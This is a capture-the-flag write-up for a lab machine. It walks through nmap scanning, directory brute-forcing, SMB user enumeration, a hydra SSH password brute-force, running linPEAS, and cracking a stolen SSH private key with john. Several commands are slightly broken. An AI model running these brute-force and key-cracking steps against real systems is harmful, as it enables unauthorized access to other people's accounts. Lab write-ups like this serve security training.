
## Write-up

1) First and foremost, i did a simple SYN scan on the IP `10.10.221.217`  using nmap:

```shell
nmap -sS -O 10.10.221.217
```

I got ssh and http as open ports.

2) Then i first went over to http://10.10.221.217:80 to check if the website was up and it  was. But the site was still in development. I needed to find the hidden directories.

3) I used the tool called `dirsearch` to conduct a search process,  which revealed the name of the hidden directory, it was `/development`. It was kinda like bruteforcing because i had to use wordlist like `/usr/share/wordlists/dirbuster/directory-list-1.0.txt

4) Went over to http://10.10.221.217:80/development and got:

```chrome
# Index of /development

|![[ICO]](http://10.10.221.217/icons/blank.gif)|[Name](http://10.10.221.217/development/?C=N;O=D)|[Last modified](http://10.10.221.217/development/?C=M;O=A)|[Size](http://10.10.221.217/development/?C=S;O=A)|[Description](http://10.10.221.217/development/?C=D;O=A)|
|---|---|---|---|---|
|---|   |   |   |   |
|![[PARENTDIR]](http://10.10.221.217/icons/back.gif)|[Parent Directory](http://10.10.221.217/)||-||
|![[TXT]](http://10.10.221.217/icons/text.gif)|[dev.txt](http://10.10.221.217/development/dev.txt)|2018-04-23 14:52|483||
|![[TXT]](http://10.10.221.217/icons/text.gif)|[j.txt](http://10.10.221.217/development/j.txt)|2018-04-23 13:10|235||
|---|   |   |   |   |

Apache/2.4.18 (Ubuntu) Server at 10.10.221.217 Port 80
```

5) Found `j.txt` file which looked like someone's initial letter of the name, opened it and found: 

```chrome
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```

6) Now time to find the username, for that, in the nmap scan i saw another service open, which was SMB.

7) Then I quickly enumerated SMB using enum4linux :

```shell
enum4linux -a 10.10.221.217
```

```enum4linux

The syntax of Enum4Linux is nice and simple: **"enum4linux [options] ip"**  

**TAG**            **FUNCTION**  

-U             get userlist  
-M             get machine list  
-N             get namelist dump (different from -U and-M)  
-S             get sharelist  
-P             get password policy information  
-G             get group and member list

-a             all of the above (full basic enumeration)  
```

8) Using this, I found out that one of the users name is jan.
9) Now for the password, we will be bruteforcing it using the popular tool `hydra`.\

```shell
hydra -l jan -P /usr/share/wordlists/rockyou.txt -t 6 ssh://10.10.221.217
```

10) With the `hydra` tool, the password was `armando`

11) Now that we have the username and the password, I without wasting any time, tried logging into ssh.

```shell
ssh jan@10.10.221.217 -p
```

12) Entered the password, and BOOM! I was in!

13) Found the other user's username as i tinkered in jan's machine. the other user's username is kay.

14) Now escalate the privileges i used a script from https://github.com/Tib3rius/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh

15) To use this script in the remote connection, i used `scp`

```shell
scp ~/Documents/Linpeas/linpeas.sh jan@10.10.175.217:/dev/shm
```

16) Then:

```shell
$ chmod +x linpeas.sh
$ ./linpeas.sh | tee linlogfile.txt
```

17) Got a whole bunch of data, but this is what caught my eye:

```shell
[+] Looking for ssl/ssh files
/home/kay/.ssh/authorized_keys                                               
/home/kay/.ssh/id_rsa
/home/kay/.ssh/id_rsa.pub
Port 22
PermitRootLogin prohibit-password
PubkeyAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes
Private SSH keys found!:
/home/kay/.ssh/id_rsa
```

18) Went over  to check the `id_rsa` file, got the key and created a file in my home to store it in `kay_id_rsa`.

19) Now i will be using John the Ripper, another popular password cracking tool, to crack the password of the user kay.

20) Now i will create a hash for `kay_id_rsa`  in `forjohn.txt` using `ss2john.py`

```shell
/usr/share/john/ssh2john.py > forjohn.txt
```

21) Then use that hash to crack the password:

```shell
john forjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

22) Success!! The password is : `beeswax`

23) now time to log in!

```shell
ssh -i kay_id_rsa kay@10.10.175.217
```

Success!!

24) Now that we are in, I did

```shell
$ ls
pass.bak

$ cat pass.bak
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```

I got the password!!

This was a really long challenge, and i enjoyed every bit of it.




